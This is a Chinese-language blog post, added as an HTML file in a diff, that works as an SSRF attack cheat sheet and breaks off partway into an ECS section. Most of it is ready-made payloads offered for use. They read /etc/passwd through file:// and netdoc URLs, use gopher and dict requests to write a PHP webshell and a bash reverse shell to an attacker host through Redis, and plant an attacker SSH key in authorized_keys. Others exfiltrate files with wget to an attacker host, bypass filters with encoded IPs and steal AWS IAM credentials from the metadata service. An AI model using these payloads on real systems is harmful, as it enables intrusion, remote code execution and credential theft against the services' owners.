@@ -1,0 +1,662 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color" content="#3367D6"/>
+  <link rel="apple-touch-icon" href="/icons-192.png">
+  <link rel="manifest" href="/manifest.json">
+  
+  <meta name="generator" content="Hexo 7.3.0">
+
+  
+
+  
+
+  
+    <meta name="author" content="John Doe">
+  
+
+  
+
+  
+
+  <title>SSRF | Hexo</title>
+
+  
+
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+
+  <!--mathjax latex数学公式显示支持-->
+  
+  
+
+  
+
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+</head>
+<body>
+  <div class="root-container">
+    
+<!-- header container -->
+<header class="header-container post">
+  
+    <div class="post-image" style="background-image: url(/1.jpg)"></div>
+  
+
+  <!-- navbar -->
+<nav class="navbar">
+  <div class="navbar-content">
+    <!-- logo -->
+    <div class="navbar-logo">
+      <a href="/">
+        
+          Hexo
+        
+      </a>
+    </div>
+    <!-- link -->
+    <div class="navbar-link">
+      <div class="navbar-btn">
+        <div></div>
+        <div></div>
+        <div></div>
+      </div>
+      <ul class="navbar-list">
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+    <div class="header-content">
+      <div class="post-text layout-block">
+        <div class="layout-margin">
+          <h1 class="title-wrap">SSRF</h1>
+          <h2 class="title-sub-wrap">
+            <strong>John Doe</strong>
+            <span>发布于</span>
+            <time  class="article-date" datetime="2024-11-04T16:00:00.000Z" itemprop="datePublished">2024-11-05</time>
+          </h2>
+          
+          
+          <ul class="wrap-list dark">
+  
+</ul>
+          <ul class="wrap-list dark">
+  
+    <li><a href="/tags/web%E6%BC%8F%E6%B4%9E/">🏷️ web漏洞</a></li>
+  
+</ul>
+        </div>
+      </div>
+    </div>
+  
+
+  
+  
+  
+</header>
+
+    <!-- 文章 -->
+
+<!-- 文章内容 -->
+<div class="body-container">
+  <article class="content-container layout-block post-container">
+    <div class="article-info">
+      
+      
+      
+      
+      <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
+        <h3 id=""><a href="#" class="headerlink" title=""></a></h3><span id="more"></span>
+
+<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>PHP函数：</p>
+<ul>
+<li><p>file_get_contents</p>
+</li>
+<li><p>fsockopen</p>
+</li>
+<li><p>curl_exec</p>
+</li>
+<li><p>fopen</p>
+</li>
+<li><p>mdf_file</p>
+</li>
+</ul>
+<h2 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h2><p>(1)HTTP&#x2F;HTTPS</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssrf.php?page=http://127.0.0.1:80</span><br><span class="line">ssrf.php?page=http://127.0.0.1:8080</span><br><span class="line">ssrf.php?page=https://127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p>(2)File</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssrf.php?page=file:///etc/passwd</span><br><span class="line">ssrf.php?page=file://\/\/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>(3)Dict</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dict://<span class="tag">&lt;<span class="name">user</span>&gt;</span>;<span class="tag">&lt;<span class="name">auth</span>&gt;</span>@<span class="tag">&lt;<span class="name">host</span>&gt;</span>:<span class="tag">&lt;<span class="name">port</span>&gt;</span>/d:<span class="tag">&lt;<span class="name">word</span>&gt;</span>:<span class="tag">&lt;<span class="name">database</span>&gt;</span>:<span class="tag">&lt;<span class="name">n</span>&gt;</span></span><br><span class="line">ssrf.php?page=dict://服务器地址:11111/</span><br></pre></td></tr></table></figure>
+
+<p>(4)文件传输协议</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ftp://user:password@目标站点/  //FTP协议</span><br><span class="line">tftp://目标站点/../file.txt //TFTP协议</span><br><span class="line">sftp://目标站点:11111/  //SFTP协议</span><br></pre></td></tr></table></figure>
+
+<p>(5)LDAP</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssrf.php?page=ldap://localhost:11211/%0astats%0aquit</span><br></pre></td></tr></table></figure>
+
+<p>(6)SMB</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssrf.php?page=smb://server/share</span><br></pre></td></tr></table></figure>
+
+<p>(7)Redis&#x2F;Memcached</p>
+<p>Redis</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proxy?url=redis://Redis服务器地址:6379/set%20mykey%20myvalue</span><br></pre></td></tr></table></figure>
+
+<p>Memcached</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proxy?url=memcached://Memcached服务器地址:11211/stats</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/proxy?url=memcached://Memcached服务器地址:11211/set%20session_user_id%200%20200%2010</span><br><span class="line">//用值0覆盖Memcached中应用程序的会话密钥（session_user_id）</span><br><span class="line">/proxy?url=memcached://Memcached服务器地址:11211/get%20session_user_id</span><br><span class="line">//获取密钥session_user_id的值，用于验证先前的设置命令是否成功</span><br></pre></td></tr></table></figure>
+
+<p>(8)Gopher</p>
+<p>格式</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://host:port/selector</span><br></pre></td></tr></table></figure>
+
+<p>与SMTP通信发送电子邮件</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /ssrf?url=gopher://内部SMTP服务器地址:25/_MAIL%20FROM%3A%3Csnowwolf%40test.com%3E%0D%0ARCP%54%20TO%3A%3Cuser%40example.com%3E%0D%0ADATA%0D%0ASubject%3A%20SSRF%20Test%0D%0A%0D%0AThis%20is%20an%20email%20sent%20via%20SSRF%20exploit.%0D%0A.%0D%0AQUIT%0D%0A HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<p>SMTP页面</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">        $commands = array(</span></span><br><span class="line"><span class="meta">                &#x27;HELO victim.com&#x27;,</span></span><br><span class="line"><span class="meta">                &#x27;MAIL FROM: &lt;admin@ghostwolflab.com&gt;&#x27;,</span></span><br><span class="line"><span class="meta">                &#x27;RCPT To: &lt;admin@test.com&gt;&#x27;,</span></span><br><span class="line"><span class="meta">                &#x27;DATA&#x27;,</span></span><br><span class="line"><span class="meta">                &#x27;Subject: @security!&#x27;,</span></span><br><span class="line"><span class="meta">                &#x27;Hello, woot woot!&#x27;,</span></span><br><span class="line"><span class="meta">                &#x27;.&#x27;</span></span><br><span class="line"><span class="meta">        );</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">        $payload = implode(&#x27;%0A&#x27;, $commands);</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">        header(&#x27;Location: gopher://0:25/_&#x27;.$payload);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>创建MongoDB用户</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://内部MongoDB服务器地址:27017/_%a0%00%00%00%00%00%00%00%00%00%00%00%dd%07%00%00%00%00%00%00%00%8b%00%00%00%02insert%00%06%00%00%00users%00%02$db%00%0a%00%00%00percetron%00%04documents%00V%00%00%00%030%00N%00%00%00%02username%00%06%00%00%00admin%00%02password%00%09%00%00%00admin123%00%02permission%00%0e%00%00%00administrator%00%00%00%00</span><br></pre></td></tr></table></figure>
+
+<p>HTTP</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gopher://<span class="tag">&lt;<span class="name">proxyserver</span>&gt;</span>:8080/_GET http://<span class="tag">&lt;<span class="name">attacker:80</span>&gt;</span>/x HTTP/1.1%0A%0A</span><br><span class="line">gopher://<span class="tag">&lt;<span class="name">proxyserver</span>&gt;</span>:8080/_POST%20http://<span class="tag">&lt;<span class="name">attacker</span>&gt;</span>:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body</span><br></pre></td></tr></table></figure>
+
+<p>回连1337端口</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">创建evil.com/redirect.php页面</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">header(&quot;Location: gopher://攻击者主机:1337/_SSRF%0ATest!&quot;);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">访问地址</span><br><span class="line">https://目标WEB应用程序/?q=http://evil.com/redirect.php</span><br></pre></td></tr></table></figure>
+
+
+<p>(9)Netdoc</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssrf.php?url=netdoc:///etc/passwd</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>(1)WSGI</p>
+<p>易受攻击的WSGI应用程序</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def application(environ, start_response):</span><br><span class="line">//环境变量包含SSRF攻击期间服务器传递的信息</span><br><span class="line">    url = environ.get(&#x27;HTTP_X_TARGET_URL&#x27;)</span><br><span class="line">    if url and url.startswith(&quot;http&quot;):</span><br><span class="line">    //验证不足，还应该考虑其它请求协议和内部资源的访问</span><br><span class="line">        content = urlopen(url).read()</span><br><span class="line">        //如果url来自不受信任的来源，则可能出现SSRF漏洞</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://WSGI服务器地址:8000/_%00%1A%00%00%0A%00WSGI_FILE%0C%00/tmp/test.py</span><br></pre></td></tr></table></figure>
+
+<p>脚本</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/payloads/SSRF/WSGI.py">WSGI</a></p>
+<table>
+<thead>
+<tr>
+<th>标头</th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>modifier1</td>
+<td>(1 byte)</td>
+<td>0 (%00)</td>
+</tr>
+<tr>
+<td>datasize</td>
+<td>(2 bytes)</td>
+<td>26 (%1A%00)</td>
+</tr>
+<tr>
+<td>modifier2</td>
+<td>(1 byte)</td>
+<td>0 (%00)</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>变量     (UWSGI_FILE)</th>
+<th></th>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>key length</td>
+<td>(2 bytes)</td>
+<td>10</td>
+<td>(%0A%00)</td>
+<td></td>
+</tr>
+<tr>
+<td>key data</td>
+<td>(m bytes)</td>
+<td></td>
+<td>UWSGI_FILE</td>
+<td></td>
+</tr>
+<tr>
+<td>value length</td>
+<td>(2 bytes)</td>
+<td>12</td>
+<td>(%0C%00)</td>
+<td></td>
+</tr>
+<tr>
+<td>value data</td>
+<td>(n bytes)</td>
+<td></td>
+<td>&#x2F;tmp&#x2F;test.py</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>(2)Redis</p>
+<p>SSH覆盖执行系统命令</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/proxy?url=redis://Redis服务器地址:6379/config%20set%20dir%20/var/lib/redis/.ssh/</span><br><span class="line"># 将Redis保存数据的目录更改为Redeis进程运行时的用户目录.ssh</span><br><span class="line">/proxy?url=redis:// Redis服务器地址:6379/config%20set%20dbfilename%20authorized_keys</span><br><span class="line"># 将数据库文件名更改为authorized_keys，这是SSH服务器再确定SSH访问的授权公钥时查找的文件</span><br><span class="line">/proxy?url=redis:// Redis服务器地址:6379/set%20mykey%20%22ssh-rsa%20AAAAB3Nza...user@attacker.com%22</span><br><span class="line"># 将mykey密钥的值设置为攻击者的公共SSH密钥</span><br><span class="line">/proxy?url=redis://Redis服务器地址:6379/save</span><br><span class="line"># 指示Redis保存数据，这回将攻击者的公钥写入.ssh/authorized_keys文件，接下来便可以通过SSH连接Redis的服务器并执行系统命令</span><br></pre></td></tr></table></figure>
+
+<p>获取一个webshell</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">url=dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html</span><br><span class="line">url=dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php</span><br><span class="line">url=dict://127.0.0.1:6379/SET%20mykey%20&quot;&lt;\x3Fphp system($_GET[0])\x3F&gt;&quot;</span><br><span class="line">url=dict://127.0.0.1:6379/SAVE</span><br></pre></td></tr></table></figure>
+
+<p>获取一个PHP回连的webshell</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">url=gopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml</span><br><span class="line">url=gopher://127.0.0.1:6379/_config%20set%20dbfilename%20reverse.php</span><br><span class="line">url=gopher://127.0.0.1:6379/_set%20payload%20%22%3C%3Fphp%20shell_exec%28%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FREMOTE_IP%2FREMOTE_PORT%200%3E%261%27%29%3B%3F%3E%22</span><br><span class="line">url=gopher://127.0.0.1:6379/_save</span><br></pre></td></tr></table></figure>
+
+<p>(3)PDF</p>
+<p>源文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">%PDF-1.5</span><br><span class="line">1 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">  /Type /XObject</span><br><span class="line">  /Subtype /Image</span><br><span class="line">  /Width 500</span><br><span class="line">  /Height 500</span><br><span class="line">  /Filter /DCTDecode</span><br><span class="line">  /ColorSpace /DeviceRGB</span><br><span class="line">  /Length 12345</span><br><span class="line">  /F (http://攻击者主机地址/)</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">...二进制PDF文件数据...</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">attachment</span> <span class="attr">href</span>=<span class="string">&quot;file:///root/secret.txt&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    exfil = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">    exfil.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;file:///etc/passwd&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    exfil.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript">    exfil.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="variable language_">this</span>.<span class="property">responseText</span>);&#125;</span></span><br><span class="line"><span class="language-javascript">    exfil.<span class="property">onerror</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;failed!&#x27;</span>)&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>(4)SNI</p>
+<p>SNI利用OpenSSL</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> OpenSSL <span class="keyword">import</span> SSL</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">//建立TCP连接</span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sock.connect((<span class="string">&#x27;外部允许的服务器地址&#x27;</span>, <span class="number">443</span>))</span><br><span class="line"></span><br><span class="line">//创建SSL上下文</span><br><span class="line">ctx = SSL.Context(SSL.SSLv23_METHOD)  //使用适当方法</span><br><span class="line">ssl_sock = SSL.Connection(ctx, sock)</span><br><span class="line"></span><br><span class="line">//设置SNI为内部目标地址</span><br><span class="line">ssl_sock.set_tlsext_host_name(<span class="string">b&#x27;内部目标地址&#x27;</span>)</span><br><span class="line"></span><br><span class="line">执行TLS握手</span><br><span class="line">ssl_sock.do_handshake()</span><br><span class="line"></span><br><span class="line">//通过SSL连接发送HTTP请求</span><br><span class="line">ssl_sock.sendall(<span class="string">b&quot;GET / HTTP/1.1\r\nHost: 外部允许的服务器地址\r\n\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">//读取响应</span><br><span class="line">response = ssl_sock.recv(<span class="number">4096</span>)</span><br><span class="line"><span class="built_in">print</span>(response)</span><br><span class="line"></span><br><span class="line">//取消连接</span><br><span class="line">ssl_sock.shutdown()</span><br><span class="line">ssl_sock.close()</span><br></pre></td></tr></table></figure>
+
+<p>命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl s_client -connect 目标地址:443 -servername <span class="string">&quot;内部目标地址&quot;</span> -crlf</span><br></pre></td></tr></table></figure>
+
+<p>(5)wget</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --method=PUT --body-file=/etc/passwd ftp://攻击者主机/</span><br></pre></td></tr></table></figure>
+
+<p>(6)DoS</p>
+<p>环回接口DoS攻击</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlencode</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">&quot;http://目标WEB应用程序地址/ssrf/ssrf.php?&quot;</span></span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&quot;target&quot;</span>: <span class="string">&quot;http://localhost:8080/接口&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    full_url = base_url + urlencode(params)</span><br><span class="line">    requests.get(full_url)</span><br></pre></td></tr></table></figure>
+
+<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>DNS</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://受害者网站/ssrf?payload=http://攻击者的DNS服务器</span><br></pre></td></tr></table></figure>
+
+<p>时间延迟</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://受害者网站/ssrf?payload=http://攻击者服务器/delay</span><br></pre></td></tr></table></figure>
+
+<p>更多盲注</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SSRF/Blind.md">Blind</a></p>
+<h2 id="云实例"><a href="#云实例" class="headerlink" title="云实例"></a>云实例</h2><h3 id="AWS"><a href="#AWS" class="headerlink" title="AWS"></a>AWS</h3><p>AWS实例元数据服务是Amazon EC2实例中提供的一项服务，允许这些实例访问有关自身的元数据</p>
+<ul>
+<li><p>ipv4端点(旧版)：<a target="_blank" rel="noopener" href="http://169.254.169.254/latest/meta-data/">http://169.254.169.254/latest/meta-data/</a></p>
+</li>
+<li><p>ipv4端点(新版)需要X-aws-ec2-metadata-token标头</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> TOKEN=`curl -X PUT -H <span class="string">&quot;X-aws-ec2-metadata-token-ttl-seconds: 21600&quot;</span> <span class="string">&quot;http://169.254.169.254/latest/api/token&quot;</span>`</span><br><span class="line">curl -H <span class="string">&quot;X-aws-ec2-metadata-token:<span class="variable">$TOKEN</span>&quot;</span> -v <span class="string">&quot;http://169.254.169.254/latest/meta-data&quot;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>ipv6端点：http:&#x2F;&#x2F;[fd00:ec2::254]&#x2F;latest&#x2F;meta-data&#x2F;</li>
+</ul>
+<p>对于WAF，可能需要尝试不同的方法来连接到API</p>
+<ul>
+<li>指向AWS API 的DNS记录</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://instance-data</span><br><span class="line">http://169.254.169.254</span><br><span class="line">http://169.254.169.254.nip.io/</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>HTTP重定向</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Static:http://nicob.net/redir6a</span><br><span class="line">Dynamic:http://nicob.net/redir-http-169.254.169.254:80-</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>对IP进行编码</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">http://425.510.425.510 Dotted decimal with overflow</span><br><span class="line">http://2852039166 Dotless decimal</span><br><span class="line">http://7147006462 Dotless decimal with overflow</span><br><span class="line">http://0xA9.0xFE.0xA9.0xFE Dotted hexadecimal</span><br><span class="line">http://0xA9FEA9FE Dotless hexadecimal</span><br><span class="line">http://0x41414141A9FEA9FE Dotless hexadecimal with overflow</span><br><span class="line">http://0251.0376.0251.0376 Dotted octal</span><br><span class="line">http://0251.00376.000251.0000376 Dotted octal with padding</span><br><span class="line">http://0251.254.169.254 Mixed encoding (dotted octal + dotted decimal)</span><br><span class="line">http://[::ffff:a9fe:a9fe] IPV6 Compressed</span><br><span class="line">http://[0:0:0:0:0:ffff:a9fe:a9fe] IPV6 Expanded</span><br><span class="line">http://[0:0:0:0:0:ffff:169.254.169.254] IPV6/IPV4</span><br><span class="line">http://[fd00:ec2::254] IPV6</span><br></pre></td></tr></table></figure>
+
+<p>访问启动实例时指定的用户数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://169.254.169.254/latest/user-data</span><br></pre></td></tr></table></figure>
+
+<p>查询有关实例的各种元数据的其它URL，例如主机名、ipv4地址和其它属性</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">http://169.254.169.254/latest/meta-data/</span><br><span class="line">http://169.254.169.254/latest/meta-data/ami-id</span><br><span class="line">http://169.254.169.254/latest/meta-data/reservation-id</span><br><span class="line">http://169.254.169.254/latest/meta-data/hostname</span><br><span class="line">http://169.254.169.254/latest/meta-data/public-keys/</span><br><span class="line">http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key</span><br><span class="line">http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key</span><br><span class="line">http://169.254.169.254/latest/dynamic/instance-identity/document</span><br><span class="line"></span><br><span class="line">Jira SSRF导致AWS信息泄露</span><br><span class="line">https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/metadata/v1/maintenance</span><br><span class="line"></span><br><span class="line">公开暴露</span><br><span class="line">http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/</span><br></pre></td></tr></table></figure>
+
+<p>脚本</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/payloads/SSRF/EC2.sh">EC2</a></p>
+<p>(1)IAM</p>
+<p>获取临时凭证</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/ssrf?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/[Role Name]</span><br><span class="line"></span><br><span class="line"># 例子</span><br><span class="line">/ssrf?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance</span><br><span class="line">/ssrf?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy</span><br><span class="line">/ssrf?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access</span><br></pre></td></tr></table></figure>
+
+<p>使用IAM凭证交互</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws s3 <span class="built_in">ls</span> --region &lt;region-name&gt; --access-key-id &lt;AccessKeyId&gt; --secret-access-key &lt;SecretAccessKey&gt; --session-token &lt;Token&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(2)ECS</p>
+<p>如果在ECS实例上有可访问文件系统的SSRF，可以尝试提取&#x2F;proc&#x2F;self&#x2F;environ以获取UUID</p>
+<p>然后执行以下命令提取附加角色的IAM密钥</p>
